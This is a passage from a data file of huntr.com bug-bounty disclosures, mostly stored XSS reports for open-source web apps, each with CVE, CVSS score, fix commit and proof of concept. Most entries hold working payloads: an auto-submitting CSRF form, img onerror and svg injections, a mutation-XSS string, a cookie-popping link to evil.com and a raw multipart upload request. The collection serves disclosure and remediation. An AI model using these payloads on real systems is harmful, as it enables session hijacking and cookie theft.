<form action=\"http://127.0.0.1:9666/flash/add\" method=\"POST\">\n      <input type=\"hidden\" name=\"package\" value=\"XSS\" />\n      <input type=\"hidden\" name=\"urls\" value=\"javascript&#58;alert&#40;&#96;XSS&#96;&#41;\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\nLogin as user.\nGo to http://localhost:9666/collector\nClick XSS > alert(`XSS`)\nImpact\nAn attacker can force a victim to run malicious JavaScript code."}, "https://huntr.com/bounties/baae3180-b63b-4880-b2af-1a3f30056c2b/": {"cve": "CVE-2023-0470", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-0470", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (7.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/modoboa/modoboa", "fix_commit": "https://www.github.com/modoboa/modoboa/commit/354ab6884019009249097a7f3a1881d81ecd2fd2", "description": "#Description there is an XSS vulnerability that malicious script is injected directly in list of domain\nProof of Concept\n1//go to admin/domains/\n2/ click add to add a new domain\n3/ in name section add this payload \"><img src/onerror=prompt(8)> and you can see payload executed\nPOC\nhttps://drive.google.com/file/d/1wfKb3Ath3nI-KOL8VJVjK6hYDm2rpNeZ/view?usp=sharing https://drive.google.com/file/d/1oFkYWuAwKlSXjCSC_IzTT46TVSe_UK4m/view?usp=sharing\nImpact\nCross site scripting attacks can have devastating consequences. Code injected into a vulnerable application can exfiltrate data or install malware on the user\u2019s machine. Attackers can masquerade as authorized users via session cookies, allowing them to perform any action allowed by the user account."}, "https://huntr.com/bounties/386417e9-0cd5-4d80-8137-b0fd5c30b8f8/": {"cve": "CVE-2022-4105", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-4105", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (7.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/kiwitcms/kiwi", "fix_commit": "https://www.github.com/kiwitcms/kiwi/commit/a2b169ffdef1d7c1755bade8138578423b35011b", "description": "Description\nStored XSS, also known as persistent XSS, is the more damaging of the XSS. It occurs when a malicious script is injected directly into a vulnerable web application. Due to a sanitization problem it is possible to perform both a Stored XSS and an HTML injection. Thanks to this attack it is possible to disable the history page making it unusable (for example I created a transparent page above with an infinite redirect), or it is possible to create a stored XSS.\nThe problem is that the markdown input is sanitized in the TestPlan, but it is not sanitized by the history page. On the history page it will run.\nProof of Concept\n1 - Insert one of the following payloads into a Test Plan.\n2 - Go to the history\nStored XSS:\n<a href=\"https://evil.com/users/signin\" onmouseover=\"confirm(document.cookie)\" style=\"position: fixed; top: 0; right: 0; width: 10000px; height: 10040px; opacity:0.00001;\">foo</a>\nStored HTML Injection - Disable the history page:\n<a href='https://evil.com/users/signin' style='position: fixed; top: 0; right: 0; width: 10000px; height: 10040px; opacity:0.00001;'>foo</a>\nPOC Video (Payload execution):\nhttps://drive.google.com/file/d/1n7ZSrOOIb47vZro4ck2-hPRkzbSiX8CF/view?usp=sharing\nUpdate:\nI made a video where a basic user (not an admin) creates a testplan. When Admin goes into the history of the testplan created by the basic user, the XSS will appear (stored blind XSS)\nPOC:\nhttps://drive.google.com/file/d/1FlGvATGWKWXXoMB6h2Z-JOX1gVhkssx5/view?usp=share_link\nImpact\nStored XSS to run malicious javascript.\nHTML Injection to perform a UI redressing attack (clickjacking)\nHTML injection which disables the use of the history page"}, "https://huntr.com/bounties/3a676adb-085f-4927-9e00-1283c1955f92/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (7.6)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/inventree/inventree", "fix_commit": "https://www.github.com/inventree/inventree/commit/a3c9331a087a5d5ddba691149462478d0b9eda56", "description": "Description\nThe XSS is related to this previous report. The fix to prevent XSS in uploaded attachments is insufficient, as there is no mitigation when accessing attachments via a direct link.\nProof of Concept\nSteps to reproduce:\n1. Log in to Inventree\n2. Click on Parts. Add a new Category and create a Part\n3. Click on Attachments and upload the PoC file xss.html (Screenshot 1)\n4. Right Click on the Attachment & Select `Copy link address`. The link should have the format `/media/part_files/<part_id>/xss.html`\n5. Paste the link in a new tab and observe that the XSS is triggered (Screenshot 2)\nProof of Concept Payload:\n<html>\n<script>alert(document.location)</script>\n</html>\nScreenshot 1\nScreenshot 2\nImpact\nThe impact is JavaScript Code Execution. In order to carry out a succesful attack, the attacker needs a low privilege user that is allowed to create or edit Parts to upload the malicious attachment. The attacker then sends the direct link to the malicious attachment to an administrator. If the administrator visits the link while logged in to Inventree, the impact is essentially full account takeover."}, "https://huntr.com/bounties/4b7fb92c-f06b-4bbf-82dc-9f013b30b6a6/": {"cve": "CVE-2022-3355", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3355", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (8.2)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/inventree/inventree", "fix_commit": "https://www.github.com/inventree/inventree/commit/5a08ef908dd5344b4433436a4679d122f7f99e41", "description": "Description\nBy uploading SVG files, the users can perform Stored XSS attack.\nCopy the following code and save as filename.svg.\nProof of Concept\n<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)</x:script>\n[1] Login as user with upload permission.\n[2] upload the payload injected SVG file at https://demo.inventree.org/order/sales-order/3/\n[3] Copy the uploaded svg file url and open in new tab. (every logged user can access to this url)\n[4] XSS ! (https://demo.inventree.org/media/so_files/3/yourfile.svg)\nif you need more specific information, feel free to contact me.\nImpact\nIf an attacker can execute the script in the victim's browser via SVG file, they might compromise that user by stealing its cookies."}, "https://huntr.com/bounties/aa610613-6ebb-4544-9aa6-046dc28fe4ff/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (8.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/hay-kot/mealie", "fix_commit": "https://www.github.com/hay-kot/mealie/commit/13850cda1f9cb02a8c788030ba6cfa96bba33571", "description": "Description\nA low privilege user can insert malicious JavaScript code into the Recipe Instructions which will execute in another person's browser that visits the recipe.\nProof of Concept\n<img src=x onerror=alert(document.domain)> \nReproduction Steps:\nAs a lower privileged user login to the Mealie web application.\nCreate a recipe and using the inline markdown editor add the Proof of Concept code to the Instructions.\nAn alert box will appear indicating the presence of XSS.\nImpact\nA lower privilege user can submit malicious JavaScript into the Recipe Instructions which will execute in the context of another person's browser when they navigate to the vulnerable page. Since this is a Stored XSS vulnerability, no user interaction is required besides browsing to the vulnerable page. An attacker can use this XSS vulnerability to do anything that JavaScript can do, including but not limited to, making arbitrary HTTP requests in the victim's browser, hook a victim's browser, and hijack an admin session."}, "https://huntr.com/bounties/e5a8e90d-0425-4379-b5c6-ca8ff4db509f/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (7.6)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/hay-kot/mealie", "fix_commit": "https://www.github.com/hay-kot/mealie/commit/13850cda1f9cb02a8c788030ba6cfa96bba33571", "description": "Description\n1.Create a new recipe.\n2.Edit this recipe and add this payload <img src=x onerror=confirm(document.cookie)>\n3.Save the recipe and reload the recipe page\nImpact\nXss"}, "https://huntr.com/bounties/8a100b7f-cd95-4acf-ada1-7f22d5f251bc/": {"cve": "CVE-2022-31136", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-31136", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Critical (9)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/bookwyrm-social/bookwyrm", "fix_commit": "https://www.github.com/bookwyrm-social/bookwyrm/commit/fe33fdcf564a6a5667aef75d5456bea08feab50d", "description": "Description\nbookwyrm HTML input sanitizer is vulnerable to Mutation XSS. The payload could be stored and displayed on the homepage of the website (path /#feed or /#discovery) making it widely affects all users and the main website.\nProof of Concept\nEdit a book description:\n// PoC\n<math><mtext><table><mglyph><style><![CDATA ><img src=x onerror=alert('Pwned')></style><img title=\"]]&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert('Pwned')&gt;\">\nAccess to the /#feed (homepage of logged-in user) or /#discovery (which contains the book payload) will trigger the malicious code and pop up a Pwned alert.\nLink video PoC Mutation XSS\nSuggestion\nThe vulnerable base on the weakness of HTMLParserthat it is not guaranteed to successfully parse all kinds of string input. You could find another replacement sanitizer, such as DOMPurify to achieve more accuracy and still support HTML.\nImpact\nThe attacker can deface the website, leak users' sensitive data, sneakily collect data, or take advantage of other attacks (see XSS - OSWAP more details)"}, "https://huntr.com/bounties/ab296cf5-7a3e-4f49-8f63-5b35fc707f03/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Medium (6.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/inventree/inventree", "fix_commit": "https://www.github.com/inventree/inventree/commit/e83995b4f564574445e2ba059de0c03ed69411c4", "description": "Description\nCross site scripting using iframe\nProof of Concept\n1.Goto https://demo.inventree.org/company/manufacturers/ 2.Create new Manufracturer 3.In Add notes Section add this payload <iframe src=\"https://brutelogic.com.br/poc.svg\"></iframe> and save 4.Visit this address https://demo.inventree.org/company/ID\nPOC :- Visit this url https://demo.inventree.org/company/39/\nImpact\nCross site scripting"}, "https://huntr.com/bounties/c7a47f08-5462-4eda-9015-8dba653bc658/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Critical (9)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/inventree/inventree", "fix_commit": "https://www.github.com/inventree/inventree/commit/26bf51c20a1c9b3130ac5dd2e17649bece5ff84f", "description": "Description\nThe application inventree is vulnerable to Stored XSS in customer company name field.\nProof of Concept\nVideo PoC Link: https://drive.google.com/file/d/11tKQzqKFobDEuqigsQYIdQhMnqSLIBsi/view?usp=sharing\nImpact\nThis allows the attacker to execute malicious scripts in all the project members browser and it can lead to session hijacking, sensitive data exposure, and worse."}, "https://huntr.com/bounties/4cae8442-c042-43c2-ad89-6f666eaf3d57/": {"cve": "CVE-2022-2113", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-2113", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (8.4)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/inventree/inventree", "fix_commit": "https://www.github.com/inventree/inventree/commit/26bf51c20a1c9b3130ac5dd2e17649bece5ff84f", "description": "Description\nThe application inventree is vulnerable to Stored XSS in part description field.\nProof of Concept\nVideo PoC link:\nhttps://drive.google.com/file/d/1ZFgWiVpalxZ8zGeDrErezjZCQjB3VP-w/view?usp=sharing\nImpact\nThis allows the attacker to execute malicious scripts in all the project members browser and it can lead to session hijacking, sensitive data exposure, and worse."}, "https://huntr.com/bounties/01936c26-1fdf-46da-bf3d-116c39257423/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Medium (6.6)\nAttack vector\nPhysical\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/nerrorsec/googledorker", "fix_commit": "https://www.github.com/nerrorsec/googledorker/commit/7f242b44567f8434e4454071793b7f57f10e0625", "description": "Description\nStored XSS via domain argument :\nProof of Concept\nrun this command ./GoogleDorker.py -d '\"><svg onload=alert(1)>' visit created file\nImpact\nxss"}, "https://huntr.com/bounties/6961d738-60e4-461a-acd3-e276d422070f/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (7.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/posthog/posthog", "fix_commit": "https://www.github.com/posthog/posthog/commit/c0a2abd6d721a14ee8cfb7fc9193a12cc04aa729", "description": "Description\nUpon a user creates a new organisation and invites members, by opening the invitation, the XSS payload is being executed.\nProof of Concept\nJust simply create an organisation with the following name: XSS<script>alert(1)</script>.\nAfter saving the organisation, the XSS payload is being executed.\nImpact\nIn a real life scenario, an attacker redirects the user to an external asset, and saves the cookie value of the target with document.cookie() functions.\n#Recommendation It is recommended to establish proper input filtering on every user provided data."}, "https://huntr.com/bounties/d9f62613-ab1c-44bf-a66b-70569103ac49/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Medium (4.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/liangliangyy/djangoblog", "fix_commit": "https://www.github.com/liangliangyy/djangoblog/commit/e37109010f247167344ff7bd14eb1a91d8b86742", "description": "Description\nHi there, I would like to report a stored Cross Site Scripting vulnerability in djangoblog source code. Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data\nProof of Concept\nInstall a local instace of djangoblog\nLog in as admin and create an article with content <img src=a onerror=alert(document.cookie)>\nGo to article detail page and see that a pop up appears with your cookie in it.\nA POC image https://drive.google.com/file/d/11kWL4mWQNbABUtngJIBflF-dAbmMxZAy/view?usp=sharing\nImpact\nThis vulnerability is capable of stored XSS."}, "https://huntr.com/bounties/5f48dac5-e112-4b23-bbbf-cc00ba83bcf2/": {"cve": "CVE-2021-3866", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2021-3866", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Medium (6.8)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nHigh\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/zulip/zulip", "fix_commit": "https://www.github.com/zulip/zulip/commit/3eb2791c3e9695f7d37ffe84e0c2184fae665cb6", "description": "Description\nZulip is a powerful, open source group chat application that combines the immediacy of real-time chat with the productivity benefits of threaded conversations. Zulip is used by open source projects, Fortune 500 companies, large standards bodies, and others who need a real-time chat system that allows users to easily process hundreds or thousands of messages a day. With over 700 contributors merging over 500 commits a month, Zulip is also the largest and fastest growing open source group chat project , this is vulnerable for Stored XSS thru creating streams\nProof of Concept\nor original video\nImpact\nThis vulnerability is capable of stored XSS"}, "https://huntr.com/bounties/0484f447-e535-4e0c-bbbc-1fd08fe40b1a/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Medium (5.7)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/evereux/flicket", "fix_commit": "https://www.github.com/evereux/flicket/commit/c0f92b9a47294e03aed16a3df64889b5cea04320", "description": "Description\nStored XSS in deleting departments page due to unsanitized input in many places.\nProof of Concept\n1. Create a new department with name <img src=a onerror=alert(1) />\n2.  After creating the above department, Click on delete icon next to it and see the pop up.\n3. Create a new ticket with title <img src=a onerror=alert(document.cookie)>\n4. View the ticket and see the popup\n5. Go to the ticket and create a new reply with content <img src=a onerror=alert(document.cookie)>, refresh the page and see the popup.\nImpact\nStored XSS leads to html injection, phishing, cookie steal,.."}, "https://huntr.com/bounties/f2dcdb55-bb58-4e04-adb6-fdbdfc397597/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Medium (6.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/archerysec/archerysec", "fix_commit": "https://www.github.com/archerysec/archerysec/commit/793e9486e793c15142aa3a04d27ea9c96b5bbdd4", "description": "Description\nThe application is vulnerable to a Stored XSS attack.\nIt is possible for an authenticated user to inject a JavaScript payload that will be executed in the web browser of the users viewing the concerned pages.\nWhen uploading a Burp scan, the XML field \"issueBackground\" of a vulnerability is not sanitized before being stored in the database. It is returned unchanged as a \"description\" of the vulnerability.\nProof of Concept\nPOST /report-upload/upload/ HTTP/1.1\nHost: 0.0.0.0:8000\nContent-Length: 8194\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://0.0.0.0:8000\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryRfZMUQMkH0VF1JMi\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://0.0.0.0:8000/report-upload/upload/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: csrftoken=pbh0qzX8rDZYAsCWjWTK2mg2myW7En7UL0SMxXd4ZiUpee4qAuMv7ZBQ8KS74f2e; sessionid=3cpylcnskvsbqep22w86llsa7ql9ms16\nConnection: close\n\n------WebKitFormBoundaryRfZMUQMkH0VF1JMi\nContent-Disposition: form-data; name=\"csrfmiddlewaretoken\"\n\ntd5JH8qaMzhXVqz3W2IDRjzTbGRFyNeSP2GvOwG6kecozc1xdABoWWUHXSNFYF9c\n------WebKitFormBoundaryRfZMUQMkH0VF1JMi\nContent-Disposition: form-data; name=\"project_id\"\n\n7636a614-c166-461a-a09e-cf0c07b44f91\n------WebKitFormBoundaryRfZMUQMkH0VF1JMi\nContent-Disposition: form-data; name=\"scanner\"\n\nburp_scan\n------WebKitFormBoundaryRfZMUQMkH0VF1JMi\nContent-Disposition: form-data; name=\"target\"\n\ntest\n------WebKitFormBoundaryRfZMUQMkH0VF1JMi\nContent-Disposition: form-data; name=\"file\"; filename=\"poc.xml\"\nContent-Type: text/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE issues [\n<!ELEMENT issues (issue*)>\n<!ATTLIST issues burpVersion CDATA \"\">\n<!ATTLIST issues exportTime CDATA \"\">\n<!ELEMENT issue (serialNumber, type, name, host, path, location, severity, confidence, issueBackground?, remediationBackground?, references?, vulnerabilityClassifications?, issueDetail?, issueDetailItems?, remediationDetail?, requestresponse*, collaboratorEvent*, infiltratorEvent*, staticAnalysis*, dynamicAnalysis*)>\n<!ELEMENT serialNumber (#PCDATA)>\n<!ELEMENT type (#PCDATA)>\n<!ELEMENT name (#PCDATA)>\n<!ELEMENT host (#PCDATA)>\n<!ATTLIST host ip CDATA \"\">\n<!ELEMENT path (#PCDATA)>\n<!ELEMENT location (#PCDATA)>\n<!ELEMENT severity (#PCDATA)>\n<!ELEMENT confidence (#PCDATA)>\n<!ELEMENT issueBackground (#PCDATA)>\n<!ELEMENT remediationBackground (#PCDATA)>\n<!ELEMENT references (#PCDATA)>\n<!ELEMENT vulnerabilityClassifications (#PCDATA)>\n<!ELEMENT issueDetail (#PCDATA)>\n<!ELEMENT issueDetailItems (issueDetailItem*)>\n<!ELEMENT issueDetailItem (#PCDATA)>\n<!ELEMENT remediationDetail (#PCDATA)>\n<!ELEMENT requestresponse (request?, response?, responseRedirected?)>\n<!ELEMENT request (#PCDATA)>\n<!ATTLIST request method CDATA \"\">\n<!ATTLIST request base64 (true|false) \"false\">\n<!ELEMENT response (#PCDATA)>\n<!ATTLIST response base64 (true|false) \"false\">\n<!ELEMENT responseRedirected (#PCDATA)>\n<!ELEMENT sender (#PCDATA)>\n<!ELEMENT message (#PCDATA)>\n<!ELEMENT conversation (#PCDATA)>\n<!ELEMENT recipient (#PCDATA)>\n<!ELEMENT recipients (recipient*)>\n<!ELEMENT smtp (sender, recipients, message, conversation)>\n<!ELEMENT collaboratorEvent (interactionType, originIp, time, lookupType?, lookupHost?, requestresponse?, smtp?)>\n<!ELEMENT interactionType (#PCDATA)>\n<!ELEMENT originIp (#PCDATA)>\n<!ELEMENT time (#PCDATA)>\n<!ELEMENT lookupType (#PCDATA)>\n<!ELEMENT lookupHost (#PCDATA)>\n<!ELEMENT infiltratorEvent (parameterName, platform, signature, stackTrace?, parameterValue?, collaboratorEvent)>\n<!ELEMENT parameterName (#PCDATA)>\n<!ELEMENT platform (#PCDATA)>\n<!ELEMENT signature (#PCDATA)>\n<!ELEMENT stackTrace (#PCDATA)>\n<!ELEMENT parameterValue (#PCDATA)>\n<!ELEMENT dynamicAnalysis (source, sink, sourceStackTrace, sinkStackTrace, eventListenerStackTrace, sourceValue, sinkValue, eventHandlerData, eventHandlerDataType, eventHandlerManipulatedData, poc, origin, isOriginChecked, sourceElementId, sourceElementName, eventFiredEventName, eventFiredElementId, eventFiredElementName, eventFiredOuterHtml)>\n<!ELEMENT staticAnalysis (source, sink, codeSnippets)>\n<!ELEMENT source (#PCDATA)>\n<!ELEMENT sink (#PCDATA)>\n<!ELEMENT sourceStackTrace (#PCDATA)>\n<!ELEMENT sinkStackTrace (#PCDATA)>\n<!ELEMENT eventListenerStackTrace (#PCDATA)>\n<!ELEMENT sourceValue (#PCDATA)>\n<!ELEMENT sinkValue (#PCDATA)>\n<!ELEMENT eventHandlerData (#PCDATA)>\n<!ELEMENT eventHandlerDataType (#PCDATA)>\n<!ELEMENT sourceElementId (#PCDATA)>\n<!ELEMENT sourceElementName (#PCDATA)>\n<!ELEMENT eventFiredEventName (#PCDATA)>\n<!ELEMENT eventFiredElementId (#PCDATA)>\n<!ELEMENT eventFiredElementName (#PCDATA)>\n<!ELEMENT eventFiredOuterHtml (#PCDATA)>\n<!ELEMENT eventHandlerManipulatedData (#PCDATA)>\n<!ELEMENT poc (#PCDATA)>\n<!ELEMENT origin (#PCDATA)>\n<!ELEMENT isOriginChecked (#PCDATA)>\n<!ELEMENT codeSnippets (codeSnippet*)>\n<!ELEMENT codeSnippet (#PCDATA)>\n]>\n<issues burpVersion=\"2021.8.4\" exportTime=\"Wed Oct 20 14:17:19 CEST 2021\">\n  <issue>\n    <serialNumber>859448131531424768</serialNumber>\n    <type>5245344</type>\n    <name><![CDATA[aaaaa]]></name>\n    <host ip=\"93.32.21.34\">http://example.com</host>\n    <path><![CDATA[/]]></path>\n    <location><![CDATA[/]]></location>\n    <severity>Information</severity>\n    <confidence>Firm</confidence>\n    <issueBackground><![CDATA[<p>aaa<script>alert(1)</script> </p>]]></issueBackground>\n    <remediationBackground><![CDATA[<p>aaa</p>]]></remediationBackground>\n    <references><![CDATA[<ul>\n    <li><a href=\"https://portswigger.net/web-security/clickjacking\">Web Security Academy: Clickjacking</a></li>\n    <li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options\">X-Frame-Options</a></li>\n</ul>]]></references>\n    <vulnerabilityClassifications><![CDATA[<ul>\n<li><a href=\"https://cwe.mitre.org/data/definitions/693.html\">CWE-693: Protection Mechanism Failure</a></li>\n    <li><a href=\"https://capec.mitre.org/data/definitions/103.html\">CAPEC-103: Clickjacking</a></li>\n</ul>]]></vulnerabilityClassifications>\n    <requestresponse>\n      <request method=\"GET\" base64=\"true\"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGV4YW1wbGUuY29tDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTE7IFBpeGVsIDNhKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTIuMC40NTE1LjE1OSBNb2JpbGUgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0LUxhbmd1YWdlOiBmci1GUixmcjtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNw0KQ29ubmVjdGlvbjogY2xvc2UNCg0K]]></request>\n      <response base64=\"true\"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpBY2NlcHQtUmFuZ2VzOiBieXRlcw0KQWdlOiAzMTUxNDANCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9NjA0ODAwDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOA0KRGF0ZTogTW9uLCAxOCBPY3QgMjAyMSAxNToxMjozNiBHTVQNCkV0YWc6ICIzMTQ3NTI2OTQ3Ig0KRXhwaXJlczogTW9uLCAyNSBPY3QgMjAyMSAxNToxMjozNiBHTVQNCkxhc3QtTW9kaWZpZWQ6IFRodSwgMTcgT2N0IDIwMTkgMDc6MTg6MjYgR01UDQpTZXJ2ZXI6IEVDUyAoZGNiLzdGNUMpDQpWYXJ5OiBBY2NlcHQtRW5jb2RpbmcNClgtQ2FjaGU6IEhJVA0KQ29udGVudC1MZW5ndGg6IDEyNTYNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+RXhhbXBsZSBEb21haW48L3RpdGxlPgoKICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC10eXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiIC8+CiAgICA8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgogICAgYm9keSB7CiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2YwZjBmMjsKICAgICAgICBtYXJnaW46IDA7CiAgICAgICAgcGFkZGluZzogMDsKI